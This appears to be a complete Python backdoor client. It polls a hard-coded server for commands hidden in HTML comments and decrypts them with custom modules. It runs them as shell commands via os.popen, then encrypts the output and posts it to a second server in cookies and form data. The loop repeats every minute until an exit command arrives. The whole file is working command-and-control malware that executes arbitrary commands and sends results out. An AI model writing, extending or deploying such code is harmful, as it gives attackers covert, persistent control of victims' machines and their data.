import os
import sys
import time
import lljiem
import requests
import lljiam


def klj_eval(ml):
    try:
        result = os.popen(ml,'r').read()
    except:
        result = '出错了'
    # print(result)
    return result


def getml():
    html = requests.get(url='http://192.168.80.1:8000').text
    ml = html.split('<!--t')[1].split('t-->')[0]
    sjc = html.split('<!--l')[1].split('l-->')[0]
    cpu = html.split('<!--f')[1].split('f-->')[0]
    # print(ml)
    # print(sjc)
    # print(cpu)
    app = lljiem.Eternal()
    ml = app.api_jie(sc=ml, sjc=sjc, xzys='suansuan', cpuzy=cpu)
    return ml, sjc


def fshx(hx):
    ml = hx
    app = lljiam.Eternal()
    test = app.api_jia('2', ml, zfc='suansuanadmin')  # 密文 cpu 时间戳
    headers = {
        "cookie": "id=" + str(test[1]) + ';' + 'time=' + str(test[2])
    }
    data = {
        "data": test[0]
    }
    requests.post(url='http://127.0.0.1:86/cookie.php', data=data, headers=headers)


# fshx(klj_eval(getml()))
def ks():
    sjc1 = 0
    while True:
        time.sleep(2)
        mls = getml()
        ml = mls[0]
        if ml == 'exit()':
            sys.exit(0)
        else:
            if sjc1 != mls[1]:
                hx = klj_eval(ml)
                fshx(hx)
                sjc1 = mls[1]
            else:
                pass
        time.sleep(60)


ks()
